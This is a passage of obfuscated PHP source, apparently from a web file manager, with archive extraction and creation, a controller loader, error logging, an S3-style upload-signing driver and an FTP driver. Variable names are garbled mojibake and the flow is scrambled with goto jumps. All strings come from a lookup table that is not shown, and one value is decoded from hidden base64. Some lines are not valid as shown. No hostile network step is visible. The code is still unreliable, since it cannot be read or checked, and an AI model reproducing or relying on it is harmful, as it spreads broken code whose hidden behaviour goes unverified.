$C°è¢Ç£[1914], PCLZIP_OPT_REPLACE_NEWER); } return array($C°è¢Ç£[1019] => $bßÂ‘Î¡Ë, $C°è¢Ç£[1021] => $E…Ú“¯Ú¾->errorName(!0)); } } } return array($C°è¢Ç£[1019] => !1, $C°è¢Ç£[1021] => $C°è¢Ç£[1915]); goto fŒ¦ˆÎâä; F’¹ôÜšÚŞ: $C°è¢Ç£ =& $_SERVER[“]; self::init(); $BÍ·Œî…ç« = !empty($GLOBALS[$C°è¢Ç£[1036]]) ? $GLOBALS[$C°è¢Ç£[1036]] : get_path_ext($fƒÎÍ±ºÒ×); goto FÇâÜ¥Ã¿·; fŒ¦ˆÎâä: } static function fileIndex($a×Ã›Í·š, $eÜùÔò“éã, $c‡æíãˆ¼ = false) { goto a¬øó‹İ¼µ; eŒ²ïŒÃ¥ö: $A™õïœ¡ÍŞ = $f‡é·¤õ¹; if ($c‡æíãˆ¼) { $A™õïœ¡ÍŞ = $f‡é·¤õ¹[$c‡æíãˆ¼]; if ($f‡é·¤õ¹[$c¾Æ•ÛĞòó[76]]) { $A™õïœ¡ÍŞ = rtrim($A™õïœ¡ÍŞ, $c¾Æ•ÛĞòó[8]) . $c¾Æ•ÛĞòó[8]; } } return $A™õïœ¡ÍŞ; goto CŠ‡ Æ‘Ü¾; aíšÏáÎ»»: $E‰âÁØ…êÆ = count($a×Ã›Í·š); for ($DÍ½ï¼ù¬Ÿ = 0; $DÍ½ï¼ù¬Ÿ < $E‰âÁØ…êÆ; $DÍ½ï¼ù¬Ÿ++) { if ($eÜùÔò“éã == $a×Ã›Í·š[$DÍ½ï¼ù¬Ÿ][$c¾Æ•ÛĞòó[1023]]) { $f‡é·¤õ¹ = $a×Ã›Í·š[$DÍ½ï¼ù¬Ÿ]; break; } } if (!$f‡é·¤õ¹) { show_tips($c¾Æ•ÛĞòó[1916]); } goto eŒ²ïŒÃ¥ö; a¬øó‹İ¼µ: $c¾Æ•ÛĞòó =& $_SERVER[“]; self::init(); if (!is_array($a×Ã›Í·š)) { return !1; } goto aíšÏáÎ»»; CŠ‡ Æ‘Ü¾: } static function extractZipFile($Eƒ™äÂ¡, $Dä»µÔ÷ìó, $cµ¬§ƒ„Š = false) { goto C«Í‘ì†Şª; C«Í‘ì†Şª: $d†ÁÜ–‹ =& $_SERVER[“]; self::init(); $e¸»ĞíÔ¯ê = TEMP_FILES . hash_path($Eƒ™äÂ¡) . $d†ÁÜ–‹[8]; goto F²Ø»ÌÜê¢; E˜„•è›ÉØ: $a¾Î¼ÜÙ½ = get_path_father($Dä»µÔ÷ìó); if ($a¾Î¼ÜÙ½ == $Dä»µÔ÷ìó) { $a¾Î¼ÜÙ½ = $d†ÁÜ–‹[33]; } $D‰çß—ñß‰ = $CİÅØîßÂÌ->extract(PCLZIP_OPT_PATH, $e¸»ĞíÔ¯ê, PCLZIP_CB_PRE_FILE_NAME, $d†ÁÜ–‹[1914], PCLZIP_OPT_REMOVE_PATH, $a¾Î¼ÜÙ½, PCLZIP_OPT_BY_NAME, $Dä»µÔ÷ìó); goto E·ùÖ®å¹°; F²Ø»ÌÜê¢: mk_dir($e¸»ĞíÔ¯ê); $e††ÅÈãŠš = $e¸»ĞíÔ¯ê . md5($Eƒ™äÂ¡ . $Dä»µÔ÷ìó); if ($cµ¬§ƒ„Š) { $e††ÅÈãŠš = $e¸»ĞíÔ¯ê . $cµ¬§ƒ„Š; } goto C‚»‡İß…Ô; E·ùÖ®å¹°: if (!file_exists($c’¿Úæ­²ô)) { return !1; } @rename($c’¿Úæ­²ô, $e††ÅÈãŠš); return $e††ÅÈãŠš; goto cµ Ç°ÈÉì; C‚»‡İß…Ô: if (file_exists($e††ÅÈãŠš)) { return $e††ÅÈãŠš; } $CİÅØîßÂÌ = new PclZip($Eƒ™äÂ¡); $c’¿Úæ­²ô = unzip_filter_ext($e¸»ĞíÔ¯ê . get_path_this($Dä»µÔ÷ìó)); goto E˜„•è›ÉØ; cµ Ç°ÈÉì: } static function filePreview($BÅ…‘ÇéÕ„, $A¤“ÚõÌ‹Ê, $aõ¯ùÂÈÆì = false, $DÉ×äß–À = false) { goto BË¢äì«ëÌ; dŸ¯‘ñ»è÷: mk_dir($D“•ôºä»ë); $C³Ú¾‹â† = $D“•ôºä»ë . md5($BÅ…‘ÇéÕ„ . $A¤“ÚõÌ‹Ê . $DÉ×äß–À); $A±ËÚÊæ ½ = $AÆ½ÚÉå‰‘[33]; goto aÏ¥¹„ò„ˆ; AµŞ«Â¸Éâ: if (!$FŞéÖô¹”[$AÆ½ÚÉå‰‘[1019]]) { show_json($FŞéÖô¹”[$AÆ½ÚÉå‰‘[1021]], !1); } if (!file_exists($f…ö©‘ØÕÔ)) { show_json($AÆ½ÚÉå‰‘[1918], !1); } @rename($f…ö©‘ØÕÔ, $C³Ú¾‹â†); goto bÌ…ÆÌ·²È; aÏ¥¹„ò„ˆ: $FŞéÖô¹” = self::extract($BÅ…‘ÇéÕ„, $D“•ôºä»ë, $A¤“ÚõÌ‹Ê, $A±ËÚÊæ ½); if (is_array($A±ËÚÊæ ½)) { show_json($AÆ½ÚÉå‰‘[1917], !1); } if (file_exists($C³Ú¾‹â†)) { IO::fileOut($C³Ú¾‹â†, $aõ¯ùÂÈÆì, get_path_this($A±ËÚÊæ ½)); return; } goto c—ƒÚóÖ‹œ; bÌ…ÆÌ·²È: if (!file_exists($C³Ú¾‹â†)) { del_dir($D“•ôºä»ë); show_json($AÆ½ÚÉå‰‘[1919]); } IO::fileOut($C³Ú¾‹â†, $aõ¯ùÂÈÆì, $BÉ–õ³¥„); goto eŒÇ¤Â²Ï; BË¢äì«ëÌ: $AÆ½ÚÉå‰‘ =& $_SERVER[“]; self::init(); $D“•ôºä»ë = TEMP_FILES . hash_path($BÅ…‘ÇéÕ„) . $AÆ½ÚÉå‰‘[8]; goto dŸ¯‘ñ»è÷; c—ƒÚóÖ‹œ: $A±ËÚÊæ ½ = unzip_pre_name($A±ËÚÊæ ½); $BÉ–õ³¥„ = get_path_this($A±ËÚÊæ ½); $f…ö©‘ØÕÔ = unzip_filter_ext($D“•ôºä»ë . $BÉ–õ³¥„); goto AµŞ«Â¸Éâ; eŒÇ¤Â²Ï: } static function create($E›Ëø•ŒÕ, $FÕŠ¢‰õ°Ë) { $A¹¤ŒÆÌ³£ =& $_SERVER[“]; self::init(); $E†¸³â‡»¥ = get_path_ext($E›Ëø•ŒÕ); $B‘…„Ïºš = !1; if (self::checkIfType($E†¸³â‡»¥, $A¹¤ŒÆÌ³£[301])) { if (kodZipArchive::support($A¹¤ŒÆÌ³£[998])) { return kodZipArchive::create($E›Ëø•ŒÕ, $FÕŠ¢‰õ°Ë); } $FÓ™ø†ƒÙĞ = new PclZip($E›Ëø•ŒÕ); foreach ($FÕŠ¢‰õ°Ë as $a‡Š‡«´­‚ => $AÅšÈ©©Õ™) { $AÅšÈ©©Õ™ = str_replace($A¹¤ŒÆÌ³£[469], $A¹¤ŒÆÌ³£[8], $AÅšÈ©©Õ™); $FÕˆ™‘­ƒÈ = Kodio::clear(get_path_father($AÅšÈ©©Õ™)); if ($a‡Š‡«´­‚ == 0) { $B‘…„Ïºš = $FÓ™ø†ƒÙĞ->create($AÅšÈ©©Õ™, PCLZIP_OPT_REMOVE_PATH, $FÕˆ™‘­ƒÈ, PCLZIP_CB_PRE_FILE_NAME, $A¹¤ŒÆÌ³£[1920]); continue; } $B‘…„Ïºš = $FÓ™ø†ƒÙĞ->add($AÅšÈ©©Õ™, PCLZIP_OPT_REMOVE_PATH, $FÕˆ™‘­ƒÈ, PCLZIP_CB_PRE_FILE_NAME, $A¹¤ŒÆÌ³£[1920]); } } else { if (self::checkIfType($E†¸³â‡»¥, $A¹¤ŒÆÌ³£[1891])) { foreach ($FÕŠ¢‰õ°Ë as $a‡Š‡«´­‚ => $AÅšÈ©©Õ™) { $AÅšÈ©©Õ™ = str_replace($A¹¤ŒÆÌ³£[469], $A¹¤ŒÆÌ³£[8], $AÅšÈ©©Õ™); $FÕˆ™‘­ƒÈ = Kodio::clear(get_path_father($AÅšÈ©©Õ™)); if ($a‡Š‡«´­‚ == 0) { $B‘…„Ïºš = PclTarCreate($E›Ëø•ŒÕ, array($AÅšÈ©©Õ™), $E†¸³â‡»¥, null, $FÕˆ™‘­ƒÈ); continue; } $B‘…„Ïºš = PclTarAddList($E›Ëø•ŒÕ, array($AÅšÈ©©Õ™), $A¹¤ŒÆÌ³£[33], $FÕˆ™‘­ƒÈ, $E†¸³â‡»¥); } } } return $B‘…„Ïºš; } } goto A‰ÌËí»¬¦; AÔø‰¬ä×á: function Action($EùöŒÔ³Ó† = '') { goto b¨ƒ’»§Õ©; CÏá¨”ˆ¢: if (isset($b¤Ä¼ÓìÒ[$A¯ò¬‚ˆ’])) { return $b¤Ä¼ÓìÒ[$A¯ò¬‚ˆ’]; } if (is_file($BÂ¦Ò±½¸)) { include_once $BÂ¦Ò±½¸; } if (!class_exists($CÏ¦–ÃÆ¢Û)) { return actionCallError("\133{$EùöŒÔ³Ó†}\x20\75\x3e\40{$CÏ¦–ÃÆ¢Û}\135\x20\143\154\141\x73\163\40\156\157\x74\40\x65\x78\151\163\x74\x73\41"); } goto B˜‚Ú‚ÍÊñ; b¨ƒ’»§Õ©: $Bñé¸È“ªµ =& $_SERVER[ğ£]; static $b¤Ä¼ÓìÒ = array(); $E’Šß¡ã‹ñ = $EùöŒÔ³Ó†; goto AÍÅ•İ§; AÍÅ•İ§: if (isset($b¤Ä¼ÓìÒ[$E’Šß¡ã‹ñ])) { return $b¤Ä¼ÓìÒ[$E’Šß¡ã‹ñ]; } $EùöŒÔ³Ó† = trim(str_replace($Bñé¸È“ªµ[4], $Bñé¸È“ªµ[5], $EùöŒÔ³Ó†), $Bñé¸È“ªµ[4]); $BËºá©áœ = explode($Bñé¸È“ªµ[5], $EùöŒÔ³Ó†); goto E¬Éí²ù®; B˜‚Ú‚ÍÊñ: $b¤Ä¼ÓìÒ[$A¯ò¬‚ˆ’] = new $CÏ¦–ÃÆ¢Û(); $b¤Ä¼ÓìÒ[$E’Šß¡ã‹ñ] = $b¤Ä¼ÓìÒ[$A¯ò¬‚ˆ’]; return $b¤Ä¼ÓìÒ[$A¯ò¬‚ˆ’]; goto D£…©Ç„²×; E¬Éí²ù®: $C¼„©«ç¿ = strtolower($BËºá©áœ[0]); if (substr($C¼„©«ç¿, -6) == $Bñé¸È“ªµ[6]) { $EùöŒÔ³Ó† = substr($BËºá©áœ[0], 0, -6); $CÏ¦–ÃÆ¢Û = $EùöŒÔ³Ó† . $Bñé¸È“ªµ[7]; $BÂ¦Ò±½¸ = $Bñé¸È“ªµ[8]; if (isset($BËºá©áœ[1]) && substr(strtolower($BËºá©áœ[1]), -5) == $Bñé¸È“ªµ[9]) { $CÏ¦–ÃÆ¢Û = $EùöŒÔ³Ó† . $BËºá©áœ[1]; $BÂ¦Ò±½¸ = $Bñé¸È“ªµ[10] . $BËºá©áœ[1] . $Bñé¸È“ªµ[11]; } else { if (count($BËºá©áœ) == 3) { $CÏ¦–ÃÆ¢Û = $EùöŒÔ³Ó† . $BËºá©áœ[1] . $BËºá©áœ[2]; $BÂ¦Ò±½¸ = $Bñé¸È“ªµ[12] . $BËºá©áœ[1] . $Bñé¸È“ªµ[13] . $BËºá©áœ[2] . $Bñé¸È“ªµ[11]; } } $BÂ¦Ò±½¸ = PLUGIN_DIR . $EùöŒÔ³Ó† . $Bñé¸È“ªµ[4] . $BÂ¦Ò±½¸; } else { if (substr($C¼„©«ç¿, -5) == $Bñé¸È“ªµ[9]) { $EùöŒÔ³Ó† = substr($BËºá©áœ[0], 0, -5); return Model($EùöŒÔ³Ó†); } else { $CÏ¦–ÃÆ¢Û = $BËºá©áœ[0] . $BËºá©áœ[1]; $BÂ¦Ò±½¸ = CONTROLLER_DIR . $BËºá©áœ[0] . $Bñé¸È“ªµ[4] . $BËºá©áœ[1] . $Bñé¸È“ªµ[14]; } } $A¯ò¬‚ˆ’ = strtolower($CÏ¦–ÃÆ¢Û); goto CÏá¨”ˆ¢; D£…©Ç„²×: } function ActionApply($CÇò³ªÔóİ, $aÉ²¦ô’‘Ş = array()) { goto f°„“‘ŸŠ; f°„“‘ŸŠ: if (is_array($CÇò³ªÔóİ)) { return call_user_func_array($CÇò³ªÔóİ, $aÉ²¦ô’‘Ş); } if (function_exists($CÇò³ªÔóİ)) { return call_user_func_array($CÇò³ªÔóİ, $aÉ²¦ô’‘Ş); } $BÉáæÕôï­ = strrpos($CÇò³ªÔóİ, $_SERVER[ğ£][5]); goto e˜Ôƒá”; BºŞîĞÖÈî: if (!method_exists($f™Œ…»ÑÃë, $Dš™¬›¿Õ)) { return actionCallError("{$CÇò³ªÔóİ}\x20\155\145\x74\150\157\x64\40\156\x6f\164\x20\x65\170\x69\163\164\163\41"); } $bºŸÏœÀØÆ = call_user_func_array(array($f™Œ…»ÑÃë, $Dš™¬›¿Õ), $aÉ²¦ô’‘Ş); return $bºŸÏœÀØÆ; goto A¹òßŞ¨º ; e˜Ôƒá”: $AçòîƒĞ‚ñ = substr($CÇò³ªÔóİ, 0, $BÉáæÕôï­); $Dš™¬›¿Õ = substr($CÇò³ªÔóİ, $BÉáæÕôï­ + 1); $f™Œ…»ÑÃë = Action($AçòîƒĞ‚ñ); goto BºŞîĞÖÈî; A¹òßŞ¨º : } function actionCallError($D¬Š¯‡’©) { return write_log($D¬Š¯‡’©, $_SERVER[ğ£][15]); } goto bŠÜ¸íîâ; D®òœ’äØœ: function beforeShutdownError($Fáğˆª·ä‡ = false, $BÌå¼Ü = '', $c—’  ©“™ = '', $AÇ´Ì“Â‘Ô = 0) { $aÑŒÑˆ ­ =& $_SERVER[ğ£]; switch ($Fáğˆª·ä‡) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $d¨šŞ‰ì‰Î = $aÑŒÑˆ ­[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $d¨šŞ‰ì‰Î = $aÑŒÑˆ ­[36]; break; case E_STRICT: $d¨šŞ‰ì‰Î = $aÑŒÑˆ ­[37]; break; case E_NOTICE: case E_USER_NOTICE: $d¨šŞ‰ì‰Î = $aÑŒÑˆ ­[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $d¨šŞ‰ì‰Î = $aÑŒÑˆ ­[39]; break; default: break; } if (!$d¨šŞ‰ì‰Î || $d¨šŞ‰ì‰Î == $aÑŒÑˆ ­[38] || $d¨šŞ‰ì‰Î == $aÑŒÑˆ ­[39]) { return; } $c—’  ©“™ = $aÑŒÑˆ ­[4] . str_replace($_SERVER[$aÑŒÑˆ ­[33]], $aÑŒÑˆ ­[16], $c—’  ©“™); $a¹Æ¶™Â = $d¨šŞ‰ì‰Î . $aÑŒÑˆ ­[40] . $BÌå¼Ü . $aÑŒÑˆ ­[40] . $c—’  ©“™ . $aÑŒÑˆ ­[40] . $AÇ´Ì“Â‘Ô; write_log($a¹Æ¶™Â . $aÑŒÑˆ ­[41] . get_caller_msg(1), $aÑŒÑˆ ­[15]); } $_SERVER[$_SERVER[ğ£][42]] = $_SERVER[$_SERVER[ğ£][33]] . $_SERVER[ğ£][43]; $d‰“ˆŒ¸ï‘ = strrev(base64_decode($_SERVER[ğ£][44])); goto AØ·íŞ–½; F¦÷Á¡ºä–: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($EŒ³áğ½æ) { parent::__construct($EŒ³áğ½æ); $this->signatureVersion($_SERVER[“][200]); } public function uploadFormData($d„è›™ö¹¨, $Aã‰®†¾»ö = 3600) { goto BàòĞÌ¤Úš; Cğ³ß™®¨»: $b„ÁªÉš = $E¢”«™ôµä[1123]; $Dä–Ò‘Õ = $Aã‰®†¾»ö . $E¢”«™ôµä[33]; $CÏÂ»ôö± = $E¢”«™ôµä[1087]; goto Eî¢¼åŞöË; Cµ’àÌª°Ò: $eã×æ¶àË” = $E¢”«™ôµä[59]; $B®»æÑñÇ = gmdate($E¢”«™ôµä[1122]); $dÛ˜ìÈåëØ = gmdate($E¢”«™ôµä[674]); goto Cğ³ß™®¨»; BàòĞÌ¤Úš: $E¢”«™ôµä =& $_SERVER[“]; $BğñÊŒ‘¨ = $E¢”«™ôµä[185]; $CÓ‡”¿ìƒ = $E¢”«™ôµä[1121]; goto Cµ’àÌª°Ò; F¬‰³¦®İ: $cŞÏìê§¬Ò = base64_encode(json_encode($d”‡‹ŸÓá)); $cÌ Ì…È… = hash_hmac($E¢”«™ôµä[1131], $dÛ˜ìÈåëØ, $E¢”«™ôµä[1132] . $this->secret, !0); $EÚÕ¸ó»“· = hash_hmac($E¢”«™ôµä[1131], $this->region, $cÌ Ì…È…, !0); goto Eš‹™ê¾ÜÄ; Eî¢¼åŞöË: $FÍ¾‹™ÀÒ° = array($this->accessKey, $dÛ˜ìÈåëØ, $this->region, $eã×æ¶àË”, $b„ÁªÉš); $D©¢ªÂ¯´ = implode($E¢”«™ôµä[8], $FÍ¾‹™ÀÒ°); $d”‡‹ŸÓá = array($E¢”«™ôµä[1089] => gmdate($E¢”«™ôµä[1088], strtotime($E¢”«™ôµä[1124])), $E¢”«™ôµä[1090] => array(array($E¢”«™ôµä[1092] => $this->bucket), array($E¢”«™ôµä[1091] => $BğñÊŒ‘¨), array($E¢”«™ôµä[1093], $E¢”«™ôµä[1094], $E¢”«™ôµä[33]), array($E¢”«™ôµä[1093], $E¢”«™ôµä[1125], $E¢”«™ôµä[33]), array($E¢”«™ôµä[1093], $E¢”«™ôµä[1126], $E¢”«™ôµä[33]), array($E¢”«™ôµä[1095] => $CÏÂ»ôö±), array($E¢”«™ôµä[1127] => $D©¢ªÂ¯´), array($E¢”«™ôµä[1128] => $CÓ‡”¿ìƒ), array($E¢”«™ôµä[1129] => $B®»æÑñÇ), array($E¢”«™ôµä[1130] => $Dä–Ò‘Õ))); goto F¬‰³¦®İ; Eš‹™ê¾ÜÄ: $E—¿ë­ÓĞ¦ = hash_hmac($E¢”«™ôµä[1131], $eã×æ¶àË”, $EÚÕ¸ó»“·, !0); $AÒÕöĞÇ† = hash_hmac($E¢”«™ôµä[1131], $b„ÁªÉš, $E—¿ë­ÓĞ¦, !0); $EºŞ¶¿¤ä = hash_hmac($E¢”«™ôµä[1131], $cŞÏìê§¬Ò, $AÒÕöĞÇ†); goto c¨—Úà×„; c¨—Úà×„: $Ağ”½¼” = array($E¢”«™ôµä[199] => $E¢”«™ôµä[33], $E¢”«™ôµä[1133] => $E¢”«™ôµä[33], $E¢”«™ôµä[1091] => $BğñÊŒ‘¨, $E¢”«™ôµä[1095] => $CÏÂ»ôö±, $E¢”«™ôµä[1099] => $cŞÏìê§¬Ò, $E¢”«™ôµä[1134] => $D©¢ªÂ¯´, $E¢”«™ôµä[1135] => $CÓ‡”¿ìƒ, $E¢”«™ôµä[1136] => $B®»æÑñÇ, $E¢”«™ôµä[1137] => $Dä–Ò‘Õ, $E¢”«™ôµä[1138] => $EºŞ¶¿¤ä, $E¢”«™ôµä[169] => $this->getHost()); return $Ağ”½¼”; goto EÑç«ÚÒµ; EÑç«ÚÒµ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($AÜ“ØéŠ¹) { parent::__construct(); if (count($AÜ“ØéŠ¹) > 0) { $this->_init($AÜ“ØéŠ¹); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($eğ“Î”ŸÏŞ) { $E‡ëÄ­Äš¨ =& $_SERVER[“]; global $config; $this->appCharset = $config[$E‡ëÄ­Äš¨[1139]]; $this->systemCharset = $config[$E‡ëÄ­Äš¨[1140]]; if (isset($eğ“Î”ŸÏŞ[$E‡ëÄ­Äš¨[1141]]) && $eğ“Î”ŸÏŞ[$E‡ëÄ­Äš¨[1141]]) { $this->systemCharset = $eğ“Î”ŸÏŞ[$E‡ëÄ­Äš¨[1141]]; } } public function iconvApp($DÒ¥–É‡œí) { return $this->iconvTo($DÒ¥–É‡œí, $this->systemCharset, $this->appCharset); } public function iconvSystem($AÅ¢¸¼İñî) { return $this->iconvTo($AÅ¢¸¼İñî, $this->appCharset, $this->systemCharset); } public function getPathOuter($B²Î¾Û‘êê) { goto fªÇÉˆåĞ“; fªÇÉˆåĞ“: $f°öô¡°åÔ =& $_SERVER[“]; $bÚ¢Ïƒ¹ˆ³ = $this->iconvApp($this->pathBase); $B²Î¾Û‘êê = $this->iconvApp($B²Î¾Û‘êê); goto eÁ¿í†ÖÜ»; F–Ë‡‹·œ÷: return $this->pathDriver . $f°öô¡°åÔ[8] . ltrim($B²Î¾Û‘êê, $f°öô¡°åÔ[8]); goto D‰Öï¡í¬; añ¼©ŠÂ¡: $B²Î¾Û‘êê = KodIO::clear($B²Î¾Û‘êê); $B²Î¾Û‘êê = substr($B²Î¾Û‘êê, strlen($bÚ¢Ïƒ¹ˆ³)); if (empty($this->pathDriver)) { return $B²Î¾Û‘êê; } goto F–Ë‡‹·œ÷; eÁ¿í†ÖÜ»: if (substr($bÚ¢Ïƒ¹ˆ³, 0, 2) == $f°öô¡°åÔ[1142]) { $bÚ¢Ïƒ¹ˆ³ = BASIC_PATH . substr($bÚ¢Ïƒ¹ˆ³, 2); } if (substr($B²Î¾Û‘êê, 0, 2) == $f°öô¡°åÔ[1142]) { $B²Î¾Û‘êê = BASIC_PATH . substr($B²Î¾Û‘êê, 2); } $bÚ¢Ïƒ¹ˆ³ = KodIO::clear($bÚ¢Ïƒ¹ˆ³); goto añ¼©ŠÂ¡; D‰Öï¡í¬: } private function _init($A³íŠƒö‹Å = array()) { $dˆ•µæÈê =& $_SERVER[“]; if (!function_exists($dˆ•µæÈê[1143])) { show_json(LNG($dˆ•µæÈê[1144]), !1); } $this->config = $A³íŠƒö‹Å; $this->charsetReset($A³íŠƒö‹Å); foreach ($A³íŠƒö‹Å as $aéù×àøÜ => $A¶ôõ¤ÒÎ¨) { if (isset($this->{$aéù×àøÜ})) { $this->{$aéù×àøÜ} = $A¶ôõ¤ÒÎ¨; } } return $this->_login($A³íŠƒö‹Å); } private function _login($eÑƒÌŸÊ«) { goto aÑ¡˜ëĞÂï; CÙòÛøç: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $C¤Â°çó½í = @ftp_login($this->connect, $this->username, $this->userpass); goto C†Í¤¸²Öê; AİËÔÕïÊ­: $D÷¥Ûô¢ÚŒ[$dÈîàÊô£] = array($D›„ÄßÊ‘[1148] => $this->connect, $D›„ÄßÊ‘[169] => $this->host, $D›„ÄßÊ‘[168] => $this->scheme, $D›„ÄßÊ‘[170] => $this->port); return $C¤Â°çó½í; goto F›÷Éºä«; aÑ¡˜ëĞÂï: $D›„ÄßÊ‘ =& $_SERVER[“]; static $D÷¥Ûô¢ÚŒ = array(); $dÈîàÊô£ = md5(json_encode($eÑƒÌŸÊ«)); goto eä¾†Ğ¹¨À; eä¾†Ğ¹¨À: if (isset($D÷¥Ûô¢ÚŒ[$dÈîàÊô£])) { foreach ($D÷¥Ûô¢ÚŒ[$dÈîàÊô£] as $FÅ©òŒ¼†œ => $Fğî³‹İ§¥) { $this->{$FÅ©òŒ¼†œ} = $Fğî³‹İ§¥; } return !0; } $e³ñÀÕîæã = parse_url(trim($this->server, $D›„ÄßÊ‘[8])); $this->host = $e³ñÀÕîæã[$D›„ÄßÊ‘[169]]; goto e‡ã‚»±êã; C†Í¤¸²Öê: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Bòéñœ—˜º = $this->pasv == $D›„ÄßÊ‘[83] ? !0 : !1; @ftp_pasv($this->connect, $Bòéñœ—˜º); goto AİËÔÕïÊ­; e‡ã‚»±êã: $E‚½áŠ„Ö = isset($e³ñÀÕîæã[$D›„ÄßÊ‘[168]]) && $e³ñÀÕîæã[$D›„ÄßÊ‘[168]] == $D›„ÄßÊ‘[1145] ? !0 : !1; $this->scheme = $E‚½áŠ„Ö ? $D›„ÄßÊ‘[1146] : $D›„ÄßÊ‘[1147]; $this->port = isset($e³ñÀÕîæã[$D›„ÄßÊ‘[170]]) ? $e³ñÀÕîæã[$D›„ÄßÊ‘[170]] : 21; goto CÙòÛøç; F›÷Éºä«: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($dÈ¢£ÙŸñá, $D—ŞçÑ¯Œª = '', $C—¡°ôö±´ = REPEAT_RENAME) { if ($this->setContent($dÈ¢£ÙŸñá, $D—ŞçÑ¯Œª)) { return $this->getPathOuter($dÈ¢£ÙŸñá); } return !1; } public function mkdir($AÂˆÎÄ¯“, $C²™‘¼’š = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $AÂˆÎÄ¯“ = $this->iconvSystem($AÂˆÎÄ¯“); if ($this->isFolder($AÂˆÎÄ¯“) || @ftp_mkdir($this->connect, $AÂˆÎÄ¯“)) { return $this->getPathOuter($AÂˆÎÄ¯“); } if (!$this->mkdir($this->pathFather($AÂˆÎÄ¯“))) { return !1; } if ($AÂˆÎÄ¯“ = @ftp_mkdir($this->connect, $AÂˆÎÄ¯“)) { return $this->getPathOuter($AÂˆÎÄ¯“); } return !1; } public function copyFile($b¸»à˜¾ù², $E®‰¬Ûƒé³) { goto d’·…áÌ ; cóªèÕ³öÌ: $this->tempFileRemve($eÌ„†Ò«å™); return $fĞÈ¨Ğˆ¹ì; goto F¯Ï£êß°; d’·…áÌ : if (!$this->_isconn()) { return !1; } $eÄÓ„„ÃÖ‚ = $this->pathThis($this->iconvSystem($b¸»à˜¾ù²)); $eÌ„†Ò«å™ = $this->tempFile($eÄÓ„„ÃÖ‚); goto F¬Š‰¯‰“¢; F¬Š‰¯‰“¢: $fáŸ‘íÔ± = $this->iconvApp($eÌ„†Ò«å™); $this->download($b¸»à˜¾ù², $fáŸ‘íÔ±); $fĞÈ¨Ğˆ¹ì = $this->upload($E®‰¬Ûƒé³, $fáŸ‘íÔ±); goto cóªèÕ³öÌ; F¯Ï£êß°: } public function moveFile($eŠíÙŸòå¨, $DŠòö£¥Şƒ) { if (!$this->_isconn()) { return !1; } $eŠíÙŸòå¨ = $this->iconvSystem($eŠíÙŸòå¨); $DŠòö£¥Şƒ = $this->iconvSystem($DŠòö£¥Şƒ); $Fí»ƒ‚Š£ò = @ftp_rename($this->connect, $eŠíÙŸòå¨, $DŠòö£¥Şƒ); return $Fí»ƒ‚Š£ò ? $this->getPathOuter($DŠòö£¥Şƒ) : !1; } public function delFile($bÒİ„¢ñÂŞ) { if (!$this->_isconn()) { return !1; } $bÒİ„¢ñÂŞ = $this->iconvSystem($bÒİ„¢ñÂŞ); return @ftp_delete($this->connect, $bÒİ„¢ñÂŞ); } public function delFolder($B¿ì¸‰§­Ş) { if (!$this->_isconn()) { return !1; } $B¿ì¸‰§­Ş = $this->iconvSystem($B¿ì¸‰§­Ş); $B²“™·ÜÍš = $this->ftpList($B¿ì¸‰§­Ş); if (!$B²“™·ÜÍš) { return @ftp_rmdir($this->connect, $B¿ì¸‰§­Ş); } foreach ($B²“™·ÜÍš as $FŒ‡ÄÜÁù) { if ($this->isFolder($FŒ‡ÄÜÁù)) { $FŒ‡ÄÜÁù = $this->iconvApp($FŒ‡ÄÜÁù); $this->delFolder($FŒ‡ÄÜÁù); } else { @ftp_delete($this->connect, $FŒ‡ÄÜÁù); } } return @ftp_rmdir($this->connect, $B¿ì¸‰§­Ş); } public function rename($AÆõíÁÃğ©, $f›’â·ÍØË) { goto Aï‚ÇÉš·ò; BÔé‹ ã•: return $BÑîËè¿’à ? $this->getPathOuter($f°½¾˜ÔŸ¦) : !1; goto b§Å…³«Æ¹; aÙ½£ºÎË™: $AŠ¤ñÑÔ = $this->iconvSystem($AŠ¤ñÑÔ); $AÆõíÁÃğ© = $this->iconvSystem($AÆõíÁÃğ©); $b´èÛ èª = $this->pathFather($AÆõíÁÃğ©); goto dó±ß‚ÁÈ†; Aï‚ÇÉš·ò: $eñèóë‹¨ =& $_SERVER[“]; if (!$this->_isconn()) { return !1; } $AŠ¤ñÑÔ = $this->fileNameAuto($this->pathFather($AÆõíÁÃğ©), $f›’â·ÍØË); goto aÙ½£ºÎË™; dó±ß‚ÁÈ†: $f°½¾˜ÔŸ¦ = rtrim($b´èÛ èª, $eñèóë‹¨[8]) . $eñèóë‹¨[8] . $AŠ¤ñÑÔ; $BÑîËè¿’à = @ftp_rename($this->connect, $AÆõíÁÃğ©, $f°½¾˜ÔŸ¦); $f°½¾˜ÔŸ¦ = $this->iconvApp($f°½¾˜ÔŸ¦); goto BÔé‹ ã•; b§Å…³«Æ¹: } private function folderInfo($c´‹”ÛÑ£°, $BÈÁ†½˜„– = false) { goto có‘òÓÈ; có‘òÓÈ: $AĞ’³ô¸½‚ =& $_SERVER[“]; $BÏ‚ß¼‚ÂÖ = $this->getPathOuter(rtrim($c´‹”ÛÑ£°, $AĞ’³ô¸½‚[8])); $AÌø¥÷×Ôé = $this->pathThis($BÏ‚ß¼‚ÂÖ); goto aƒÓ™‡ÆŞÎ; aƒÓ™‡ÆŞÎ: $Fƒ³¼±¯„ô = $this->iconvSystem($c´‹”ÛÑ£°); if ($BÈÁ†½˜„–) { return array($AĞ’³ô¸½‚[28] => $AÌø¥÷×Ôé, $AĞ’³ô¸½‚[75] => $BÏ‚ß¼‚ÂÖ, $AĞ’³ô¸½‚[29] => $AĞ’³ô¸½‚[76]); } $Aæçâœô‚ = array($AĞ’³ô¸½‚[28] => $AÌø¥÷×Ôé, $AĞ’³ô¸½‚[75] => 